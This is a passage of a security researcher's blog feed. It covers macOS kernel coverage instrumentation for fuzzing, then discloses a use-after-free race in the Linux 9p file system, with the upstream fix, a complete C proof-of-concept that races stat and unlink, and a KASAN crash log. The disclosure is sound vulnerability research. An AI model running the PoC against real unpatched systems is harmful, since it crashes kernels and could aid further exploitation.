  <span class="o">|</span> <span class="mh">0x08</span><span class="o">:</span> <span class="n">add</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x1</span> <span class="o">|</span>        <span class="o">|</span> <span class="mh">0x08</span><span class="o">:</span> <span class="n">add</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">x1</span> <span class="o">|</span>        <span class="k">for</span> <span class="n">address</span> <span class="mh">0x04</span>
  <span class="o">|</span> <span class="mh">0x0c</span><span class="o">:</span> <span class="n">ret</span>            <span class="o">|</span>        <span class="o">|</span> <span class="mh">0x0c</span><span class="o">:</span> <span class="n">ret</span>            <span class="o">|</span>
  <span class="o">+----------------------+</span>        <span class="o">+----------------------+</span></code></pre></figure>

<p>Even though Hyperpom is not capable of loading a simple Mach-O file, let alone booting XNU or instrumenting KEXTs, its heavily commented source code is definitely worth reading. Hyperpom can only map a shellcode that has zero trappable instructions or sytem calls e.g. MSR, MRS, SVC,… into a VM memory and execute it, which is a significant barrier to fuzzing real targets. To be able to execute a Mach-O file, you need to <a href="https://github.com/kallsyms/appbox/blob/main/src/dyld.rs">map the dyld shared cache</a>, <a href="https://github.com/kallsyms/appbox/blob/main/src/lib.rs">trap system calls</a> and probably a lot more.</p>

<p>I want to mention that using breakpoints is slower than the binary patching method I used in Pishi. <a href="https://developer.arm.com/documentation/102412/0103/Handling-exceptions/Taking-an-exception">Taking</a> and <a href="https://developer.arm.com/documentation/102412/0103/Handling-exceptions/Exception-handling-examples">handling</a> an exception, then <a href="https://developer.arm.com/documentation/102412/0103/Handling-exceptions/Returning-from-an-exception">returning</a> from it, causes some overhead.
<img src="/assets/pishi/breakpoint.svg" width="300" style="display: block; margin: 0 auto" /></p>

<p>We may also be able to modify QEMU to handle breakpoints while booting XNU with UTM to collect coverage instead of writing the hypervisor from scratch.</p>

<p>I also had some thoughts about using <a href="https://github.com/AsahiLinux/m1n1">M1N1</a> to instrument kernel and KEXTs, Similar to the modified XNU exception handler, M1N1 also allows you to instrument KEXTs that are not available in a VM environment, such as AppleAVD.</p>

<p>As a last resort I could also implement the instrumentation part in the KEXT to find BBs and patch addresses at runtime similar to MacRootKit. However, one thread may attempt to execute an address while we want to instrument it. especially in the time window of instrumenting ten thousand BBs, 
This race condition is challenging, it requires suspending all threads and disabling preemption.</p>

<h4 id="additional-features-and-optimizations">Additional features and optimizations.</h4>

<p>Current user-mode binary instrumentation options in macOS, such as <a href="https://github.com/googleprojectzero/TinyInst">TinyInst</a>, <a href="https://blog.impalabs.com/2211_hyperpom.html">Hyperpom</a>, <a href="https://blog.quarkslab.com/android-greybox-fuzzing-with-afl-frida-mode.html">Frida</a>( Even though you can easily customize Frida, and I have used it many times similar to how <a href="https://www.usenix.org/conference/woot20/presentation/heinze">seemoo-lab</a> has fuzzed bluetoothd.) and <a href="https://www.youtube.com/watch?v=fTNzylTMYks">QBDI</a>, primarily support scenarios where a library can be <a href="https://github.com/googleprojectzero/Jackalope/tree/main/examples">loaded in a harness</a> to call target functions. However, these options do not support fuzzing attack vectors located deep within a <a href="https://www.youtube.com/watch?app=desktop&amp;v=D1jNCy7-g9k">XPC</a> or <a href="https://www.launchd.info/">launchd daemon/agent</a> executable file, since fuzzers cannot directly spawn these processes (only launchd can do that) to send input and collect coverage in a loop. In the next blog post, I will attempt to implement coverage-guided fuzzing for these specific targets.</p>

<p>I will also discuss additional features like.</p>
<ul>
  <li>Supporting snapshot.</li>
  <li>Data flow coverage.</li>
  <li>Binary level Address Sanitizer.</li>
  <li>Sharing coverage from Guest OS to Host OS(Remote attack surfaces).</li>
</ul>

<p>Also lengthy discussing about other coverage metrics and optimizations in instrumentation with <a href="https://web.archive.org/web/20201112023136/https://repret.wordpress.com/2017/05/01/improving-coverage-guided-fuzzing-using-static-analysis/">Static Analysis</a>, <a href="https://www.cse.iitb.ac.in/~uday/dfaBook-web/">Data Flow Analysis</a> (e.g <a href="https://web.archive.org/web/20201109022539/https://repret.wordpress.com/2018/03/21/128/">Disposable Probes</a>, <a href="https://users.sdsc.edu/~mtikir/publications/papers/issta02.pdf">Dominator Tree</a>).</p>

<p>Further Resources on Optimizations</p>
<ol>
  <li><a href="https://arxiv.org/pdf/2004.14191">Efficient Binary-Level Coverage Analysis</a></li>
  <li><a href="https://www.usenix.org/system/files/usenixsecurity23-priyadarshan.pdf">Safer: Efficient and Error-Tolerant Binary Instrumentation</a></li>
  <li><a href="https://arxiv.org/abs/1812.10729">Fine-grained Code Coverage Measurement in Automated Black-box Android Testing</a></li>
  <li><a href="https://drops.dagstuhl.de/storage/01oasics/oasics-vol047_wcet2015/OASIcs.WCET.2015.95/OASIcs.WCET.2015.95.pdf">Using SMT Solving for the Lookup of Infeasible Paths in Binary Programs</a></li>
  <li><a href="https://pages.cs.wisc.edu/~ohmann/papers/ase-2016.pdf">Optimizing Customized Program Coverage</a></li>
  <li><a href="https://dl.acm.org/doi/pdf/10.1145/2500828.2500829">Deriving Code Coverage Information from Profiling Data Recorded for a Trace-based Just-in-time Compiler</a></li>
  <li><a href="https://ieeexplore.ieee.org/document/6226373">Post-silicon code coverage for multiprocessor system-on-chip designs</a></li>
  <li><a href="https://ieeexplore.ieee.org/abstract/document/5276897">A new method of test data generation for branch coverage in software testing based on EPDG and genetic algorithm</a></li>
  <li><a href="https://dl.acm.org/doi/abs/10.1016/j.jss.2008.06.051">Model-based performance analysis using block coverage measurements</a></li>
  <li><a href="https://dl.acm.org/doi/pdf/10.1145/381788.316166">Efficient Coverage Testing Using Global Dominator Graphs </a></li>
  <li><a href="https://kluedo.ub.rptu.de/frontdoor/deliver/index/docId/6410/file/_benkhadra-dissertation.pdf">Techniques For Efficient Binary-Level Coverage Analysis</a></li>
  <li><a href="https://personal.utdallas.edu/~ewong/SE6367/03-Lecture/10-Hira-01.pdf">Dominators, Super Blocks, and Program Coverage</a></li>
</ol>

<p>I also highly recommend to watch and read following resources to have a solid understanding discussed topics (BB, Edge, Path coverage,…).</p>

<ol>
  <li><a href="https://clang.llvm.org/docs/SanitizerCoverage.html">SanitizerCoverage</a></li>
  <li><a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman-5/">Fuzzing Like A Caveman</a></li>
  <li><a href="https://lcamtuf.coredump.cx/afl/technical_details.txt">AFL technical paper</a></li>
  <li><a href="https://dl.acm.org/doi/pdf/10.1145/3678722.3685537">Understanding and Improving Coverage Tracking with AFL++</a></li>
  <li><a href="https://www.youtube.com/watch?v=hNVV6sNeJyQ">Knowing the UnFuzzed and Finding Bugs with Coverage Analysis - Mark Griffin (Shmoocon 2020)</a></li>
  <li><a href="https://dl.acm.org/doi/10.1145/3320269.3384736">PathAFL: Path-Coverage Assisted Fuzzing</a></li>
  <li><a href="https://www.sciencedirect.com/science/article/pii/S0950584924001873?via%3Dihub">ENZZ: Effective N-gram coverage assisted fuzzing with nearest neighboring branch estimation</a></li>
  <li><a href="https://www.ndss-symposium.org/ndss-paper/predictive-context-sensitive-fuzzing/">Predictive Context-sensitive Fuzzing</a></li>
  <li><a href="https://lafintel.wordpress.com/">lafintel</a></li>
  <li><a href="https://www.youtube.com/watch?v=CjGGtbF3oNs">Making Software Dumberer</a> by Tavis Ormandy. despite being 14 years old, it remains the best and most comprehensive presentation on fuzzing.</li>
  <li><a href="https://andreafioraldi.github.io/articles/2019/07/20/aflpp-qemu-compcov.html">Compare coverage for AFL++ QEMU</a></li>
  <li><a href="https://www.usenix.org/system/files/sec20spring_gan_prepub.pdf">Data Flow Sensitive Fuzzing</a></li>
  <li><a href="https://groups.google.com/g/afl-users/c/D_M683KaQkg">Circumventing Fuzzing Roadblocks</a></li>
  <li><a href="https://github.com/googleprojectzero/CompareCoverage">Mateusz Jurczyk’s CompareCoverage</a></li>
  <li><a href="https://github.com/HexHive/datAFLow?tab=readme-ov-file">datAFLow</a> and its <a href="https://www.ndss-symposium.org/wp-content/uploads/fuzzing2022_23001_paper.pdf">paper</a> and <a href="https://www.youtube.com/watch?v=XsvPrsk1x5U">video</a></li>
  <li><a href="https://www.youtube.com/watch?v=yezHZuDCBho">Brandon Falk, Advanced Fuzzing: Compare shattering</a></li>
  <li><a href="https://www.usenix.org/system/files/raid2019-wang-jinghan.pdf">Be Sensitive and Collaborative: Analyzing Impact of Coverage Metrics in Greybox Fuzzing</a></li>
  <li><a href="https://qingkaishi.github.io/public_pdfs/SP22.pdf">BEACON : Directed Grey-Box Fuzzing with Provable Path Pruning</a></li>
  <li><a href="https://acmccs.github.io/papers/p2329-bohmeAemb.pdf">Directed Greybox Fuzzing</a></li>
  <li><a href="https://www.ndss-symposium.org/wp-content/uploads/fuzzing2022_23001_paper.pdf">Registered Report: DATAFLOW Towards a Data-Flow-Guided Fuzzer</a></li>
</ol>

<p>You can also find numerous valuable articles in <a href="https://wcventure.github.io/FuzzingPaper/">https://wcventure.github.io/FuzzingPaper</a></p>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[This blog post is the result of some weekend research, where I delved into Pishi, a static macOS kernel binary rewriting tool. During the weekdays, I focus on Linux kernel security at my job and would rather not investigate the Windows kernel again, which leaves macOS/iOS as the only remaining option.]]></summary></entry><entry><title type="html">Race condition in 9p file system.</title><link href="http://0.0.0.0:4000/fuzzing/2024/05/29/Race-into-9p.html" rel="alternate" type="text/html" title="Race condition in 9p file system." /><published>2024-05-29T09:01:01+09:00</published><updated>2024-05-29T09:01:01+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/05/29/Race%20into%209p</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/05/29/Race-into-9p.html"><![CDATA[<p>During our recent fuzzing efforts on various subsystems of the Linux kernel, we encountered a kernel panic. Interestingly, the kernel panic that exposed the vulnerability was not directly related to the input seed generated by our fuzzer. Instead, it was the fuzzer’s activity itself that inadvertently triggered the bug. Although the initial sample generated by the fuzzer didn’t provide a direct proof of concept (PoC), a thorough analysis of the panic log enabled us to develop a PoC for the vulnerability.
The vulnerability in the 9p file system is a race condition that leads to a use-after-free.</p>

<p><a href="https://lore.kernel.org/linux-kernel/ZlaC1Sn6WZtEGsbK@codewreck.org/T/">from commit message</a> there is a use-after-free on dentry’s d_fsdata fid list when a thread
looks up a fid through dentry while another thread unlinks it:</p>

<p>UAF thread:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">refcount_t: addition on 0<span class="p">;</span> use-after-free.
 p9_fid_get linux/./include/net/9p/client.h:262
 v9fs_fid_find+0x236/0x280 linux/fs/9p/fid.c:129
 v9fs_fid_lookup_with_uid linux/fs/9p/fid.c:181
 v9fs_fid_lookup+0xbf/0xc20 linux/fs/9p/fid.c:314
 v9fs_vfs_getattr_dotl+0xf9/0x360 linux/fs/9p/vfs_inode_dotl.c:400
 vfs_statx+0xdd/0x4d0 linux/fs/stat.c:248</code></pre></figure>

<p>Freed by:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"> p9_fid_destroy <span class="o">(</span>inlined<span class="o">)</span>
 p9_client_clunk+0xb0/0xe0 linux/net/9p/client.c:1456
 p9_fid_put linux/./include/net/9p/client.h:278
 v9fs_dentry_release+0xb5/0x140 linux/fs/9p/vfs_dentry.c:55
 v9fs_remove+0x38f/0x620 linux/fs/9p/vfs_inode.c:518
 vfs_unlink+0x29a/0x810 linux/fs/namei.c:4335</code></pre></figure>

<p>The problem is that d_fsdata was not accessed under d_lock, because
d_release() normally is only called once the dentry is otherwise no
longer accessible but since we also call it explicitly in v9fs_remove
that lock is required:
move the hlist out of the dentry under lock then unref its fids once
they are no longer accessible.</p>

<p><a href="https://github.com/torvalds/linux/blob/e0cce98fe279b64f4a7d81b7f5c3a23d80b92fbc/fs/9p/vfs_dentry.c#L48">/fs/9p/vfs_dentry.c</a></p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">void</span> <span class="nf">v9fs_dentry_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="nc">hlist_node</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>

	<span class="n">p9_debug</span><span class="p">(</span><span class="n">P9_DEBUG_VFS</span><span class="p">,</span> <span class="s">" dentry: %pd (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
		 <span class="n">dentry</span><span class="p">,</span> <span class="n">dentry</span><span class="p">);</span>
	<span class="n">hlist_for_each_safe</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">hlist_head</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span><span class="p">)</span>
		<span class="n">p9_fid_put</span><span class="p">(</span><span class="n">hlist_entry</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">p9_fid</span><span class="p">,</span> <span class="n">dlist</span><span class="p">));</span>
	<span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>fix:
<a href="https://github.com/torvalds/linux/commit/c898afdc15645efb555acb6d85b484eb40a45409">/fs/9p/vfs_dentry.c</a></p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">void</span> <span class="nf">v9fs_dentry_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="nc">hlist_node</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">n</span><span class="p">;</span>
	<span class="k">struct</span> <span class="nc">hlist_head</span> <span class="n">head</span><span class="p">;</span>

	<span class="n">p9_debug</span><span class="p">(</span><span class="n">P9_DEBUG_VFS</span><span class="p">,</span> <span class="s">" dentry: %pd (%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
		 <span class="n">dentry</span><span class="p">,</span> <span class="n">dentry</span><span class="p">);</span>

	<span class="n">spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_lock</span><span class="p">);</span>
	<span class="n">hlist_move_list</span><span class="p">((</span><span class="k">struct</span> <span class="nc">hlist_head</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_fsdata</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">head</span><span class="p">);</span>
	<span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_lock</span><span class="p">);</span>

	<span class="n">hlist_for_each_safe</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">head</span><span class="p">)</span>
		<span class="n">p9_fid_put</span><span class="p">(</span><span class="n">hlist_entry</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">p9_fid</span><span class="p">,</span> <span class="n">dlist</span><span class="p">));</span>
<span class="p">}</span></code></pre></figure>

<p>to run the poc first build the kernel and run it via virtio</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">git clone <span class="nt">--depth</span> 1 https://github.com/torvalds/linux.git
git clone <span class="nt">--depth</span> 1 https://github.com/amluto/virtme.git
<span class="nb">cd </span>linux
../virtme/virtme-configkernel  <span class="nt">--defconfig</span>
/scripts/config <span class="nt">-e</span> KASAN <span class="nt">-e</span> KASAN_INLINE <span class="nt">-e</span> WARNING
make 
../virtme/virtme-run <span class="nt">--kimg</span> <span class="nb">arch</span>/x86/boot/bzImage <span class="nt">--rwdir</span> ../testfuzz/ <span class="nt">--qemu-opts</span>  <span class="nt">-m</span> 2G <span class="nt">-smp</span> 2 <span class="nt">-enable-kvm</span></code></pre></figure>

<p>then inside the shell run the following code.
poc:</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">dirfd</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filePath</span><span class="p">;</span>
<span class="p">}</span> <span class="n">ThreadArgs</span><span class="p">;</span>

<span class="kt">void</span> <span class="o">*</span><span class="n">statThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ThreadArgs</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">ThreadArgs</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">stat</span> <span class="n">buf</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">outFile</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">retval</span> <span class="o">=</span> <span class="n">fstatat</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">dirfd</span><span class="p">,</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">outFile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">outFile</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fclose</span><span class="p">(</span><span class="n">outFile</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">unlinkThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ThreadArgs</span> <span class="o">*</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">ThreadArgs</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"!!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">unlink</span><span class="p">(</span><span class="n">args</span><span class="o">-&gt;</span><span class="n">filePath</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">pthread_t</span> <span class="n">threads</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">dirfd</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dirPath</span> <span class="o">=</span> <span class="s">"."</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filePath</span> <span class="o">=</span> <span class="s">"example.txt"</span><span class="p">;</span>
    <span class="n">ThreadArgs</span> <span class="n">args</span><span class="p">;</span>

    <span class="c1">// Open the directory file descriptor</span>
    <span class="n">dirfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">dirPath</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dirfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to open directory"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">args</span><span class="p">.</span><span class="n">dirfd</span> <span class="o">=</span> <span class="n">dirfd</span><span class="p">;</span>
    <span class="n">args</span><span class="p">.</span><span class="n">filePath</span> <span class="o">=</span> <span class="n">filePath</span><span class="p">;</span>

    <span class="c1">// Create the stat and unlink threads</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">threads</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">statThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to create stat thread"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">threads</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">unlinkThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to create unlink thread"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Wait for both threads to finish (which they never will in this setup)</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">close</span><span class="p">(</span><span class="n">dirfd</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>panic log:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="o">[</span>   17.000245] BUG: KASAN: slab-use-after-free <span class="k">in </span>p9_client_getattr_dotl+0x170/0x190
<span class="o">[</span>   17.000938] Read of size 8 at addr ffff88810590ad00 by task 9poc/151
<span class="o">[</span>   17.001713] CPU: 2 PID: 151 Comm: 9poc Tainted: G        W          6.8.0 <span class="c">#83</span>
<span class="o">[</span>   17.002433] Hardware name: QEMU Standard PC <span class="o">(</span>i440FX + PIIX, 1996<span class="o">)</span>, BIOS 1.15.0-1 04/01/2014
<span class="o">[</span>   17.003866] Call Trace:
<span class="o">[</span>   17.004259]  &lt;TASK&gt;
<span class="o">[</span>   17.004720]  dump_stack_lvl+0x4b/0x80
<span class="o">[</span>   17.005263]  print_report+0x106/0x650
<span class="o">[</span>   17.005722]  ? p9_client_getattr_dotl+0x170/0x190
<span class="o">[</span>   17.006201]  kasan_report+0xbe/0xf0
<span class="o">[</span>   17.006568]  ? p9_client_getattr_dotl+0x170/0x190
<span class="o">[</span>   17.007059]  p9_client_getattr_dotl+0x170/0x190
<span class="o">[</span>   17.007579]  v9fs_vfs_getattr_dotl+0x115/0x370
<span class="o">[</span>   17.008033]  vfs_statx+0x100/0x460
<span class="o">[</span>   17.008450]  ? __pfx_vfs_statx+0x10/0x10
<span class="o">[</span>   17.008854]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.009315]  ? getname_flags.part.0+0xb4/0x450
<span class="o">[</span>   17.009719]  vfs_fstatat+0x8e/0xc0
<span class="o">[</span>   17.010094]  __do_sys_newfstatat+0x6b/0xc0
<span class="o">[</span>   17.010547]  ? __pfx___do_sys_newfstatat+0x10/0x10
<span class="o">[</span>   17.010989]  ? srso_return_thunk+0x5/0x5f
<span class="o">[</span>   17.011340]  ? lockdep_hardirqs_on_prepare+0x277/0x410
<span class="o">[</span>   17.011861]  do_syscall_64+0xcc/0x1e0
<span class="o">[</span>   17.012303]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
<span class="o">[</span>   17.012743] RIP: 0033:0x7f3d8fd50d3e
<span class="o">[</span>   17.013134] Code: 48 89 f2 b9 00 01 00 00 48 89 fe bf 9c ff ff ff e9 07 00 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 41 89 ca b8 06 01 00 00 0f 05 &lt;3d&gt; 00 f0 ff ff 77 0b 31 c0 c3 0f 1f 84 00 00 00 00 00 48 8b 15 b9
<span class="o">[</span>   17.014874] RSP: 002b:00007f3d8fc38d78 EFLAGS: 00000213 ORIG_RAX: 0000000000000106
<span class="o">[</span>   17.015543] RAX: ffffffffffffffda RBX: 00007f3d8fc39640 RCX: 00007f3d8fd50d3e
<span class="o">[</span>   17.016198] RDX: 00007f3d8fc38db0 RSI: 00005559d64e1011 RDI: 0000000000000003
<span class="o">[</span>   17.016831] RBP: 00007f3d8fc38e50 R08: 00007f3d80000b70 R09: 0000000000000001
<span class="o">[</span>   17.017506] R10: 0000000000000000 R11: 0000000000000213 R12: 00007f3d8fc39640
<span class="o">[</span>   17.018138] R13: 0000000000000000 R14: 00007f3d8fcd17d0 R15: 00007fff30463de0
<span class="o">[</span>   17.018788]  &lt;/TASK&gt;
<span class="o">[</span>   17.019363] Allocated by task 151:
<span class="o">[</span>   17.019686]  kasan_save_stack+0x24/0x50
<span class="o">[</span>   17.020093]  kasan_save_track+0x14/0x30
<span class="o">[</span>   17.020553]  __kasan_kmalloc+0x7f/0x90
<span class="o">[</span>   17.020891]  p9_fid_create+0x3e/0x3a0
<span class="o">[</span>   17.021300]  p9_client_walk+0xa4/0x440
<span class="o">[</span>   17.021740]  v9fs_vfs_atomic_open_dotl+0x357/0x8b0
<span class="o">[</span>   17.022165]  lookup_open.isra.0+0x991/0x1550
<span class="o">[</span>   17.022568]  path_openat+0x86b/0x22f0
<span class="o">[</span>   17.022993]  do_filp_open+0x1b0/0x3e0
<span class="o">[</span>   17.023383]  do_sys_openat2+0x11d/0x160
<span class="o">[</span>   17.023725]  __x64_sys_openat+0x11e/0x1e0
<span class="o">[</span>   17.024095]  do_syscall_64+0xcc/0x1e0
<span class="o">[</span>   17.024445]  entry_SYSCALL_64_after_hwframe+0x6f/0x77
<span class="o">[</span>   17.025218] Freed by task 152:
<span class="o">[</span>   17.025506]  kasan_save_stack+0x24/0x50
<span class="o">[</span>   17.025909]  kasan_save_track+0x14/0x30
<span class="o">[</span>   17.026370]  kasan_save_free_info+0x3b/0x60
<span class="o">[</span>   17.026762]  __kasan_slab_free+0x106/0x190
<span class="o">[</span>   17.027176]  kfree+0xe1/0x300
<span class="o">[</span>   17.027555]  p9_client_clunk+0x93/0xe0
<span class="o">[</span>   17.027948]  v9fs_dentry_release+0xb4/0x140
<span class="o">[</span>   17.028437]  v9fs_remove+0x31a/0x4c0
<span class="o">[</span>   17.028774]  vfs_unlink+0x29e/0x810
<span class="o">[</span>   17.029149]  do_unlinkat+0x425/0x5c0
<span class="o">[</span>   17.029579]  __x64_sys_unlink+0xa4/0xe0
<span class="o">[</span>   17.029930]  do_syscall_64+0xcc/0x1e0
<span class="o">[</span>   17.030334]  entry_SYSCALL_64_after_hwframe+0x6f/0x77

<span class="o">[</span>   17.031059] The buggy address belongs to the object at ffff88810590ad00
                which belongs to the cache kmalloc-96 of size 96
<span class="o">[</span>   17.032134] The buggy address is located 0 bytes inside of
                freed 96-byte region <span class="o">[</span>ffff88810590ad00, ffff88810590ad60<span class="o">)</span>

<span class="o">[</span>   17.033506] The buggy address belongs to the physical page:
<span class="o">[</span>   17.033998] page:00000000d4ba65e2 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10590a
<span class="o">[</span>   17.034817] flags: 0x200000000000800<span class="o">(</span>slab|node<span class="o">=</span>0|zone<span class="o">=</span>2<span class="o">)</span>
<span class="o">[</span>   17.035307] page_type: 0xffffffff<span class="o">()</span>
<span class="o">[</span>   17.035623] raw: 0200000000000800 ffff888100042780 dead000000000122 0000000000000000
<span class="o">[</span>   17.036358] raw: 0000000000000000 0000000080200020 00000001ffffffff 0000000000000000
